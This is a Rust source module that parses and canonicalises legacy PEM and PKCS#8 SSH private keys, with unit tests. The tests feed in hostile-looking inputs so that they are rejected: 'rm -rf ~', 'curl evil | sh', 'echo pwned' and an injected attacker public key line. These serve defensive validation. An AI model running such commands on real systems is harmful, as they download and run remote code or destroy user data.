//! Legacy private key formats written by OpenSSL and old `ssh-keygen`
//! versions: PEM (`BEGIN RSA/EC/DSA PRIVATE KEY`, PKCS#1 / SEC1) and PKCS#8
//! (`BEGIN PRIVATE KEY`, `BEGIN ENCRYPTED PRIVATE KEY`).
//!
//! Unencrypted RSA, ECDSA and Ed25519 keys are decoded completely, so their
//! public key and fingerprint are known even without a `.pub` file and they can
//! be added to the agent. ECDSA keys with explicit curve parameters (what
//! `ssh-keygen -m PEM` produces when linked against `LibreSSL`, e.g. on macOS)
//! are supported too. Encrypted legacy keys and DSA keys are recognised but not
//! decoded; their details come from the `.pub` file when there is one. Their
//! structure is still checked (a DSA key is six DER integers, an encrypted
//! PKCS#8 key an algorithm and an octet string, a traditionally encrypted key
//! whole cipher blocks after a well-formed `DEK-Info`), so a file that only
//! looks like a key is not taken for one.

use std::fmt::Write as _;

use base64ct::{Base64, Encoding};
use ssh_key::private::{EcdsaKeypair, Ed25519Keypair, KeypairData, RsaKeypair};
use zeroize::Zeroizing;

use super::{KeyAlgorithm, KeyFormat};

/// DER encoding of the `id-ecPublicKey` OID (1.2.840.10045.2.1).
const OID_EC_PUBLIC_KEY: &[u8] = &[0x2a, 0x86, 0x48, 0xce, 0x3d, 0x02, 0x01];

/// The PEM label of a recognised private key block.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum PemKind {
    OpenSsh,
    Rsa,
    Ec,
    Dsa,
    Pkcs8,
    Pkcs8Encrypted,
}

/// A legacy private key as far as it could be understood.
pub(crate) struct LegacyKey {
    pub(crate) format: KeyFormat,
    pub(crate) algorithm: Option<KeyAlgorithm>,
    pub(crate) encrypted: bool,
    /// Decoded key material (unencrypted RSA/ECDSA/Ed25519 only).
    pub(crate) keypair: Option<KeypairData>,
}

/// Returns the kind of the first `-----BEGIN … PRIVATE KEY-----` line.
pub(crate) fn pem_kind(text: &str) -> Option<PemKind> {
    let line = text.lines().map(str::trim).find(|l| !l.is_empty())?;
    let label = line.strip_prefix("-----BEGIN ")?.strip_suffix("-----")?;
    Some(match label {
        "OPENSSH PRIVATE KEY" => PemKind::OpenSsh,
        "RSA PRIVATE KEY" => PemKind::Rsa,
        "EC PRIVATE KEY" => PemKind::Ec,
        "DSA PRIVATE KEY" => PemKind::Dsa,
        "PRIVATE KEY" => PemKind::Pkcs8,
        "ENCRYPTED PRIVATE KEY" => PemKind::Pkcs8Encrypted,
        _ => return None,
    })
}

/// Parses a legacy key. `None` means the file claims to be a key of this kind
/// but cannot be decoded (truncated, corrupt, or an algorithm SSH does not use).
pub(crate) fn parse(text: &str, kind: PemKind) -> Option<LegacyKey> {
    let der = pem_body(text)?;
    if der.is_empty() {
        return None;
    }
    // Traditional OpenSSL encryption is announced in the PEM headers; the
    // body is then whole blocks of ciphertext.
    let traditional_encrypted = match protection(text) {
        Protection::Plain => false,
        Protection::Traditional { block } => {
            if !matches!(kind, PemKind::Rsa | PemKind::Ec | PemKind::Dsa) || der.len() % block != 0
            {
                return None;
            }
            true
        }
        Protection::Unknown => return None,
    };
    let pem = Zeroizing::new(format!("{}\n", text.trim()));
    let key = |format, algorithm, encrypted, keypair| LegacyKey {
        format,
        algorithm,
        encrypted,
        keypair,
    };
    match kind {
        PemKind::OpenSsh => None,
        PemKind::Rsa if traditional_encrypted => {
            Some(key(KeyFormat::Pem, Some(KeyAlgorithm::Rsa), true, None))
        }
        PemKind::Rsa => {
            let keypair = decode_pkcs1_rsa(&pem)?;
            Some(key(
                KeyFormat::Pem,
                Some(KeyAlgorithm::Rsa),
                false,
                Some(keypair),
            ))
        }
        PemKind::Ec if traditional_encrypted => Some(key(KeyFormat::Pem, None, true, None)),
        PemKind::Ec => {
            let (algorithm, keypair) = decode_sec1_ec(&pem).or_else(|| sec1_by_scalar(&der))?;
            Some(key(KeyFormat::Pem, Some(algorithm), false, Some(keypair)))
        }
        PemKind::Dsa => (traditional_encrypted || is_dsa_der(&der)).then(|| {
            key(
                KeyFormat::Pem,
                Some(KeyAlgorithm::Dsa),
                traditional_encrypted,
                None,
            )
        }),
        PemKind::Pkcs8 => {
            let (algorithm, keypair) = decode_pkcs8(&pem).or_else(|| pkcs8_ec_by_scalar(&der))?;
            Some(key(KeyFormat::Pkcs8, Some(algorithm), false, Some(keypair)))
        }
        PemKind::Pkcs8Encrypted => {
            is_encrypted_pkcs8_der(&der).then(|| key(KeyFormat::Pkcs8, None, true, None))
        }
    }
}

/// The first PEM block of `text` written out canonically, for a copy that
/// holds nothing but the key: the BEGIN and END lines, the encryption headers
/// (`Proc-Type`, `DEK-Info`) if any, and the Base64 body re-wrapped at 64
/// columns, with LF line endings. `None` if the file holds anything else:
/// text after the END line, an END label other than the BEGIN one, other
/// headers, or a body that is not Base64.
pub(crate) fn canonical_pem(text: &str) -> Option<Zeroizing<String>> {
    // Notepad's "UTF-8 with BOM" and PowerShell 5.1 start files with one.
    let text = text.trim_start_matches('\u{feff}');
    let mut lines = text.lines().map(str::trim).skip_while(|l| l.is_empty());
    let label = lines
        .next()?
        .strip_prefix("-----BEGIN ")?
        .strip_suffix("-----")?;
    let headers = match protection(text) {
        Protection::Plain => false,
        Protection::Traditional { .. } => true,
        Protection::Unknown => return None,
    };
    let mut b64 = Zeroizing::new(String::new());
    let mut ended = false;
    for line in lines.by_ref() {
        if let Some(end) = line.strip_prefix("-----END ") {
            if end.strip_suffix("-----") != Some(label) {
                return None;
            }
            ended = true;
            break;
        }
        if line.contains(':') {
            // Headers come before the body.
            if !b64.is_empty() {
                return None;
            }
            continue;
        }
        b64.push_str(line);
    }
    if !ended || lines.any(|l| !l.is_empty()) {
        return None;
    }
    let der = Zeroizing::new(Base64::decode_vec(&b64).ok()?);
    let body = Zeroizing::new(Base64::encode_string(&der));
    let mut out = Zeroizing::new(format!("-----BEGIN {label}-----\n"));
    if headers {
        for (name, value) in header_fields(text) {
            let _ = writeln!(out, "{name}: {value}");
        }
        out.push('\n');
    }
    for chunk in body.as_bytes().chunks(64) {
        // Base64 is ASCII, so every chunk is valid UTF-8.
        out.push_str(std::str::from_utf8(chunk).ok()?);
        out.push('\n');
    }
    let _ = writeln!(out, "-----END {label}-----");
    Some(out)
}

/// How the first PEM block is protected, from its RFC 1421 headers.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Protection {
    /// No headers.
    Plain,
    /// `Proc-Type: 4,ENCRYPTED` and a `DEK-Info: <cipher>,<hex IV>` whose IV
    /// is one cipher block (8 or 16 bytes): traditional OpenSSL encryption.
    Traditional { block: usize },
    /// Any other headers.
    Unknown,
}

fn protection(text: &str) -> Protection {
    let headers = header_fields(text);
    if headers.is_empty() {
        return Protection::Plain;
    }
    let [("Proc-Type", "4,ENCRYPTED"), ("DEK-Info", dek)] = headers.as_slice() else {
        return Protection::Unknown;
    };
    let Some((cipher, iv)) = dek.split_once(',') else {
        return Protection::Unknown;
    };
    let cipher_ok = !cipher.is_empty()
        && cipher
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'-');
    let iv_ok = matches!(iv.len(), 16 | 32) && iv.bytes().all(|b| b.is_ascii_hexdigit());
    if cipher_ok && iv_ok {
        Protection::Traditional {
            block: iv.len() / 2,
        }
    } else {
        Protection::Unknown
    }
}

/// The `Name: value` header lines right after the first BEGIN line.
fn header_fields(text: &str) -> Vec<(&str, &str)> {
    text.lines()
        .map(str::trim)
        .skip_while(|l| !l.starts_with("-----BEGIN "))
        .skip(1)
        .take_while(|l| l.contains(':'))
        .filter_map(|l| l.split_once(':'))
        .map(|(name, value)| (name.trim(), value.trim()))
        .collect()
}

/// The whole of `der` is one DER SEQUENCE; returns what it holds.
fn der_sequence(der: &[u8]) -> Option<&[u8]> {
    match der_tlv(der)? {
        (0x30, body, []) => Some(body),
        _ => None,
    }
}

/// OpenSSL's `DSAPrivateKey`: a SEQUENCE of six INTEGERs (version, p, q, g,
/// public y, private x).
fn is_dsa_der(der: &[u8]) -> bool {
    let Some(mut body) = der_sequence(der) else {
        return false;
    };
    for _ in 0..6 {
        match der_tlv(body) {
            Some((0x02, value, rest)) if !value.is_empty() => body = rest,
            _ => return false,
        }
    }
    body.is_empty()
}

/// PKCS#8 `EncryptedPrivateKeyInfo`: a SEQUENCE of the encryption algorithm
/// (a SEQUENCE starting with its OID) and the encrypted key (an OCTET STRING).
fn is_encrypted_pkcs8_der(der: &[u8]) -> bool {
    let Some(body) = der_sequence(der) else {
        return false;
    };
    let Some((0x30, algorithm, body)) = der_tlv(body) else {
        return false;
    };
    matches!(der_tlv(algorithm), Some((0x06, oid, _)) if !oid.is_empty())
        && matches!(der_tlv(body), Some((0x04, data, [])) if !data.is_empty())
}

/// Base64-decodes the body of the first PEM block, skipping RFC 1421 headers.
/// `None` if the block is not terminated or not valid Base64.
fn pem_body(text: &str) -> Option<Zeroizing<Vec<u8>>> {
    let mut lines = text
        .lines()
        .map(str::trim)
        .skip_while(|l| !l.starts_with("-----BEGIN "));
    lines.next()?;
    let mut b64 = Zeroizing::new(String::new());
    for line in lines {
        if line.starts_with("-----END ") {
            return Base64::decode_vec(&b64).ok().map(Zeroizing::new);
        }
        if line.is_empty() || line.contains(':') {
            continue;
        }
        b64.push_str(line);
    }
    None
}

fn decode_pkcs1_rsa(pem: &str) -> Option<KeypairData> {
    use rsa::pkcs1::DecodeRsaPrivateKey;
    let key = rsa::RsaPrivateKey::from_pkcs1_pem(pem).ok()?;
    RsaKeypair::try_from(&key).ok().map(KeypairData::Rsa)
}

fn decode_sec1_ec(pem: &str) -> Option<(KeyAlgorithm, KeypairData)> {
    if let Ok(sk) = p256::SecretKey::from_sec1_pem(pem) {
        return Some((KeyAlgorithm::EcdsaP256, ec_p256(&sk)));
    }
    if let Ok(sk) = p384::SecretKey::from_sec1_pem(pem) {
        return Some((KeyAlgorithm::EcdsaP384, ec_p384(&sk)));
    }
    if let Ok(sk) = p521::SecretKey::from_sec1_pem(pem) {
        return Some((KeyAlgorithm::EcdsaP521, ec_p521(&sk)));
    }
    None
}

fn decode_pkcs8(pem: &str) -> Option<(KeyAlgorithm, KeypairData)> {
    use p256::pkcs8::DecodePrivateKey as _;
    if let Ok(key) = <rsa::RsaPrivateKey as rsa::pkcs8::DecodePrivateKey>::from_pkcs8_pem(pem) {
        let keypair = RsaKeypair::try_from(&key).ok()?;
        return Some((KeyAlgorithm::Rsa, KeypairData::Rsa(keypair)));
    }
    if let Ok(sk) = p256::SecretKey::from_pkcs8_pem(pem) {
        return Some((KeyAlgorithm::EcdsaP256, ec_p256(&sk)));
    }
    if let Ok(sk) = p384::SecretKey::from_pkcs8_pem(pem) {
        return Some((KeyAlgorithm::EcdsaP384, ec_p384(&sk)));
    }
    if let Ok(sk) = p521::SecretKey::from_pkcs8_pem(pem) {
        return Some((KeyAlgorithm::EcdsaP521, ec_p521(&sk)));
    }
    if let Ok(sk) =
        <ed25519_dalek::SigningKey as ed25519_dalek::pkcs8::DecodePrivateKey>::from_pkcs8_pem(pem)
    {
        let seed = Zeroizing::new(sk.to_bytes());
        let keypair = Ed25519Keypair::from_seed(&seed);
        return Some((KeyAlgorithm::Ed25519, KeypairData::Ed25519(keypair)));
    }
    None
}

/// Reads one DER TLV: `(tag, contents, rest)`.
fn der_tlv(input: &[u8]) -> Option<(u8, &[u8], &[u8])> {
    let (&tag, rest) = input.split_first()?;
    let (&first, mut rest) = rest.split_first()?;
    let len = if first < 0x80 {
        usize::from(first)
    } else {
        let n = usize::from(first & 0x7f);
        if n == 0 || n > 4 || rest.len() < n {
            return None;
        }
        let len = rest[..n]
            .iter()
            .fold(0usize, |acc, &b| (acc << 8) | usize::from(b));
        rest = &rest[n..];
        len
    };
    (rest.len() >= len).then(|| (tag, &rest[..len], &rest[len..]))
}

/// Fallback for SEC1 `ECPrivateKey`s whose curve is given as explicit
/// parameters: the curve is identified by the scalar length and the result is
/// cross-checked against the embedded public key when present.
fn sec1_by_scalar(der: &[u8]) -> Option<(KeyAlgorithm, KeypairData)> {
    let Some((0x30, body, _)) = der_tlv(der) else {
        return None;
    };
    let Some((0x02, version, body)) = der_tlv(body) else {
        return None;
    };
    let Some((0x04, scalar, mut body)) = der_tlv(body) else {
        return None;
    };
    if version != [1] {
        return None;
    }
    let mut embedded_public = None;
    while let Some((tag, contents, rest)) = der_tlv(body) {
        if tag == 0xa1
            && let Some((0x03, [0, point @ ..], _)) = der_tlv(contents)
        {
            embedded_public = Some(point);
        }
        body = rest;
    }
    let (algorithm, keypair) = match scalar.len() {
        32 => (
            KeyAlgorithm::EcdsaP256,
            ec_p256(&p256::SecretKey::from_slice(scalar).ok()?),
        ),
        48 => (
            KeyAlgorithm::EcdsaP384,
            ec_p384(&p384::SecretKey::from_slice(scalar).ok()?),
        ),
        65 | 66 => (
            KeyAlgorithm::EcdsaP521,
            ec_p521(&p521::SecretKey::from_slice(scalar).ok()?),
        ),
        _ => return None,
    };
    if let (Some(expected), KeypairData::Ecdsa(kp)) = (embedded_public, &keypair)
        && expected.first() == Some(&0x04)
        && expected != kp.public_key_bytes()
    {
        return None;
    }
    Some((algorithm, keypair))
}

/// Fallback for PKCS#8-wrapped EC keys with explicit curve parameters.
fn pkcs8_ec_by_scalar(der: &[u8]) -> Option<(KeyAlgorithm, KeypairData)> {
    let Some((0x30, body, _)) = der_tlv(der) else {
        return None;
    };
    let Some((0x02, _version, body)) = der_tlv(body) else {
        return None;
    };
    let Some((0x30, algorithm, body)) = der_tlv(body) else {
        return None;
    };
    let Some((0x06, oid, _)) = der_tlv(algorithm) else {
        return None;
    };
    if oid != OID_EC_PUBLIC_KEY {
        return None;
    }
    let Some((0x04, inner, _)) = der_tlv(body) else {
        return None;
    };
    sec1_by_scalar(inner)
}

fn ec_p256(sk: &p256::SecretKey) -> KeypairData {
    use p256::elliptic_curve::sec1::ToEncodedPoint;
    let public = sk.public_key().to_encoded_point(false);
    KeypairData::Ecdsa(EcdsaKeypair::NistP256 {
        public,
        private: sk.clone().into(),
    })
}

fn ec_p384(sk: &p384::SecretKey) -> KeypairData {
    use p384::elliptic_curve::sec1::ToEncodedPoint;
    let public = sk.public_key().to_encoded_point(false);
    KeypairData::Ecdsa(EcdsaKeypair::NistP384 {
        public,
        private: sk.clone().into(),
    })
}

fn ec_p521(sk: &p521::SecretKey) -> KeypairData {
    use p521::elliptic_curve::sec1::ToEncodedPoint;
    let public = sk.public_key().to_encoded_point(false);
    KeypairData::Ecdsa(EcdsaKeypair::NistP521 {
        public,
        private: sk.clone().into(),
    })
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use crate::keys::testdata as td;

    fn public_of(key: &LegacyKey) -> ssh_key::public::KeyData {
        ssh_key::public::KeyData::try_from(key.keypair.as_ref().unwrap()).unwrap()
    }

    fn expected(pub_line: &str) -> ssh_key::public::KeyData {
        ssh_key::PublicKey::from_openssh(pub_line.trim())
            .unwrap()
            .key_data()
            .clone()
    }

    #[test]
    fn labels() {
        assert_eq!(pem_kind(td::RSA_PEM), Some(PemKind::Rsa));
        assert_eq!(pem_kind(td::EC_PEM_EXPLICIT), Some(PemKind::Ec));
        assert_eq!(pem_kind(td::ED25519_PKCS8), Some(PemKind::Pkcs8));
        assert_eq!(
            pem_kind(td::RSA_PKCS8_ENCRYPTED),
            Some(PemKind::Pkcs8Encrypted)
        );
        assert_eq!(pem_kind(td::OPENSSH_ED25519), Some(PemKind::OpenSsh));
        assert_eq!(pem_kind("-----BEGIN CERTIFICATE-----\n"), None);
        assert_eq!(pem_kind(""), None);
    }

    #[test]
    fn rsa_pem_and_pkcs8_match_ssh_keygen() {
        let pem = parse(td::RSA_PEM, PemKind::Rsa).unwrap();
        assert!(!pem.encrypted);
        assert_eq!(pem.format, KeyFormat::Pem);
        assert_eq!(public_of(&pem), expected(td::RSA_PEM_PUB));
        let pkcs8 = parse(td::RSA_PKCS8, PemKind::Pkcs8).unwrap();
        assert_eq!(pkcs8.format, KeyFormat::Pkcs8);
        assert_eq!(public_of(&pkcs8), expected(td::RSA_PEM_PUB));
    }

    #[test]
    fn ec_explicit_parameters_match_ssh_keygen() {
        let key = parse(td::EC_PEM_EXPLICIT, PemKind::Ec).unwrap();
        assert_eq!(key.algorithm, Some(KeyAlgorithm::EcdsaP256));
        assert_eq!(public_of(&key), expected(td::EC_PEM_EXPLICIT_PUB));
        let wrapped = parse(td::EC_PKCS8_EXPLICIT, PemKind::Pkcs8).unwrap();
        assert_eq!(public_of(&wrapped), expected(td::EC_PEM_EXPLICIT_PUB));
    }

    #[test]
    fn ec_named_curve_and_ed25519_pkcs8() {
        let ec = parse(td::EC_NAMED, PemKind::Ec).unwrap();
        assert_eq!(ec.algorithm, Some(KeyAlgorithm::EcdsaP256));
        assert!(ec.keypair.is_some());
        let ed = parse(td::ED25519_PKCS8, PemKind::Pkcs8).unwrap();
        assert_eq!(ed.algorithm, Some(KeyAlgorithm::Ed25519));
        assert_eq!(ed.format, KeyFormat::Pkcs8);
        // RFC 8410 test seed 00..1f.
        let seed: [u8; 32] = core::array::from_fn(|i| u8::try_from(i).unwrap());
        let reference = Ed25519Keypair::from_seed(&seed);
        assert_eq!(
            public_of(&ed),
            ssh_key::public::KeyData::Ed25519(reference.public)
        );
    }

    #[test]
    fn encrypted_legacy_keys_are_recognised() {
        let key = parse(td::RSA_PEM_ENCRYPTED, PemKind::Rsa).unwrap();
        assert!(key.encrypted);
        assert!(key.keypair.is_none());
        let key = parse(td::RSA_PKCS8_ENCRYPTED, PemKind::Pkcs8Encrypted).unwrap();
        assert!(key.encrypted);
        assert_eq!(key.format, KeyFormat::Pkcs8);
    }

    fn pem(label: &str, headers: &str, der: &[u8]) -> String {
        format!(
            "-----BEGIN {label}-----\n{headers}{}\n-----END {label}-----\n",
            Base64::encode_string(der)
        )
    }

    #[test]
    fn bodies_that_are_not_decoded_are_still_checked() {
        // DSA: six integers, nothing else.
        let dsa = [
            0x30, 0x12, 0x02, 0x01, 0x00, 0x02, 0x01, 0x05, 0x02, 0x01, 0x03, 0x02, 0x01, 0x02,
            0x02, 0x01, 0x04, 0x02, 0x01, 0x01,
        ];
        let key = parse(&pem("DSA PRIVATE KEY", "", &dsa), PemKind::Dsa).unwrap();
        assert_eq!(key.algorithm, Some(KeyAlgorithm::Dsa));
        assert!(!key.encrypted);
        for junk in [
            &b"echo pwned"[..],
            &dsa[..dsa.len() - 3],
            &[dsa.as_slice(), &[0]].concat(),
        ] {
            assert!(parse(&pem("DSA PRIVATE KEY", "", junk), PemKind::Dsa).is_none());
        }

        // Encrypted PKCS#8: an algorithm and an octet string.
        assert!(parse(td::RSA_PKCS8_ENCRYPTED, PemKind::Pkcs8Encrypted).is_some());
        let fake = pem("ENCRYPTED PRIVATE KEY", "", b"#!/bin/sh\nrm -rf ~\n");
        assert!(parse(&fake, PemKind::Pkcs8Encrypted).is_none());

        // Traditional encryption: known headers, an IV of one block, whole
        // blocks of ciphertext.
        let iv =
            "Proc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,74E889E5ACC6EFCC7FD8980647578149\n\n";
        assert!(
            parse(&pem("DSA PRIVATE KEY", iv, &[7; 32]), PemKind::Dsa).is_some_and(|k| k.encrypted)
        );
        assert!(parse(&pem("DSA PRIVATE KEY", iv, &[7; 33]), PemKind::Dsa).is_none());
        for headers in [
            "Proc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,74E8\n\n",
            "Proc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC;x,74E889E5ACC6EFCC7FD8980647578149\n\n",
            "Proc-Type: 4,ENCRYPTED\n\n",
            "Comment: curl evil | sh\n\n",
        ] {
            assert!(
                parse(&pem("RSA PRIVATE KEY", headers, &[7; 32]), PemKind::Rsa).is_none(),
                "{headers:?}"
            );
        }
        assert!(parse(&pem("PRIVATE KEY", iv, &[7; 32]), PemKind::Pkcs8).is_none());
    }

    #[test]
    fn canonical_pem_holds_only_the_key() {
        for text in [
            td::RSA_PEM,
            td::RSA_PEM_ENCRYPTED,
            td::RSA_PKCS8_ENCRYPTED,
            td::EC_NAMED,
        ] {
            assert_eq!(canonical_pem(text).unwrap().as_str(), text);
            let crlf = text.replace('\n', "\r\n");
            assert_eq!(
                canonical_pem(&format!("\u{feff}\n{crlf}\n\n"))
                    .unwrap()
                    .as_str(),
                text
            );
            // The BOM right before `-----BEGIN`, as Notepad writes it: the
            // encryption headers must survive.
            assert_eq!(
                canonical_pem(&format!("\u{feff}{text}")).unwrap().as_str(),
                text
            );
        }
        let lines: Vec<&str> = td::RSA_PEM.lines().collect();
        let one_line = format!(
            "{}\n{}\n{}\n",
            lines[0],
            lines[1..lines.len() - 1].concat(),
            lines[lines.len() - 1]
        );
        assert_eq!(canonical_pem(&one_line).unwrap().as_str(), td::RSA_PEM);
        let body_start = td::RSA_PEM.find('\n').unwrap() + 1;
        for bad in [
            format!("{}ssh-ed25519 AAAA attacker\n", td::RSA_PEM),
            td::RSA_PEM.replace("-----END RSA", "-----END EC"),
            td::RSA_PEM.replace("-----END RSA PRIVATE KEY-----\n", ""),
            format!(
                "{}X-Note: hi\n{}",
                &td::RSA_PEM[..body_start],
                &td::RSA_PEM[body_start..]
            ),
            td::RSA_PEM.replacen('\n', "\nnot base64!\n", 2),
        ] {
            assert!(canonical_pem(&bad).is_none(), "{bad}");
        }
    }

    #[test]
    fn malformed_input_is_rejected_without_panicking() {
        let broken =
            "-----BEGIN RSA PRIVATE KEY-----\nnot base64!\n-----END RSA PRIVATE KEY-----\n";
        assert!(parse(broken, PemKind::Rsa).is_none());
        let truncated = &td::RSA_PEM[..td::RSA_PEM.len() / 2];
        assert!(parse(truncated, PemKind::Rsa).is_none());
        let empty = "-----BEGIN EC PRIVATE KEY-----\n-----END EC PRIVATE KEY-----\n";
        assert!(parse(empty, PemKind::Ec).is_none());
        // Garbage DER inside valid Base64.
        let junk = "-----BEGIN EC PRIVATE KEY-----\nMIIBAAAA\n-----END EC PRIVATE KEY-----\n";
        assert!(parse(junk, PemKind::Ec).is_none());
        for cut in 0..40 {
            let _ = der_tlv(&[0x30, 0x84, 0xff, 0xff, 0xff, 0xff][..cut.min(6)]);
        }
    }
}
